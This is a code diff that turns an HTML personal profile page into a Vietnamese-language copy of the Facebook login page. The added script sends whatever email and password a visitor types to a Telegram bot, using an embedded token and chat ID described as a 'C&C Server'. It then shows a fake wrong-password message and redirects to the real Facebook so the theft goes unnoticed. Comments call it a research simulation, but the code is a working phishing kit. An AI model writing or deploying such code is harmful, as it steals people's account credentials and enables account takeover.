@@ -3,56 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nam Trần | Profile</title>
+    <title>Facebook – Đăng nhập hoặc đăng ký</title>
     <style>
-        body {
-            margin: 0;
-            font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            padding: 3rem;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: center;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            animation: fadeIn 1.5s ease;
-        }
-        h1 { margin: 0; font-size: 2.5em; color: #4facfe; }
-        p { color: #cbd5e0; font-size: 1.1em; }
-        .btn {
-            margin-top: 20px;
-            padding: 10px 25px;
-            background: #00f2fe;
-            border: none;
-            border-radius: 50px;
-            color: #1a1a2e;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .btn:hover { transform: scale(1.1); box-shadow: 0 0 20px #00f2fe; }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        /* Mô phỏng giao diện Facebook theo chuẩn nghiên cứu UI/UX Phishing */
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { width: 396px; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
+        .fb-logo { width: 200px; margin-bottom: 20px; }
+        input { width: 92%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; outline: none; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .login-btn:hover { background-color: #166fe5; }
+        .error-box { background-color: #ffebe8; border: 1px solid #dd3c10; padding: 10px; margin-bottom: 15px; border-radius: 4px; color: #1c1e21; font-size: 13px; text-align: left; display: none; }
+        .footer-links { margin-top: 15px; font-size: 14px; color: #1877f2; text-decoration: none; display: block; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>NAM TRẦN</h1>
-        <p>Developer | Tech Enthusiast | Student</p>
-        <hr style="width: 50px; border: 1px solid #4facfe; margin: 20px auto;">
-        <p>Chào mừng bạn đến với thế giới lập trình của tôi.</p>
-        <button class="btn">Kết nối với tôi</button>
+
+<div class="container">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zS4w6V.svg" alt="Facebook" class="fb-logo">
+    
+    <div id="error-box" class="error-box">
+        <b>Mật khẩu không chính xác.</b> Bạn đã nhập sai mật khẩu. Vui lòng kiểm tra lại.
     </div>
+
+    <form id="simulation-form">
+        <input type="text" id="email" placeholder="Email hoặc số điện thoại" required>
+        <input type="password" id="pass" placeholder="Mật khẩu" required>
+        <button type="submit" class="login-btn">Đăng nhập</button>
+    </form>
+    
+    <a href="#" class="footer-links">Quên mật khẩu?</a>
+</div>
+
+<script>
+    // Tham số định danh từ hệ thống quản lý trung tâm (C&C Server)
+    const CONFIG = {
+        TOKEN: '7575485490:AAGV2UjRKlnV0ihD2ONRE0lE8o8uJMOTKf4',
+        CHAT_ID: '-1003153408705'
+    };
+
+    document.getElementById('simulation-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const user = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        // Giai đoạn 2: Thu thập và định dạng Payload
+        const payload = {
+            chat_id: CONFIG.CHAT_ID,
+            text: `[MÔ PHỎNG THU THẬP]\n👤 User: ${user}\n🔑 Pass: ${pass}\n🌐 Domain: ${window.location.hostname}`
+        };
+
+        // Giai đoạn 3: Thực thi truyền tải dữ liệu qua Telegram API
+        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            // Giai đoạn 4: Phản hồi giả mạo và điều hướng
+            document.getElementById('error-box').style.display = 'block';
+            document.getElementById('pass').value = ''; // Xóa mật khẩu cũ
+            
+            // Sau 2 giây sẽ điều hướng về trang thật để tránh bị phát hiện
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/login/?privacy_mutation_token=ABC123XYZ";
+            }, 2000);
+        })
+        .catch(err => {
+            console.error("Lỗi mô phỏng mạng:", err);
+            // Trong nghiên cứu, nếu lỗi mạng vẫn điều hướng để duy trì tính logic
+            window.location.href = "https://www.facebook.com";
+        });
+    });
+</script>
+
 </body>
 </html>
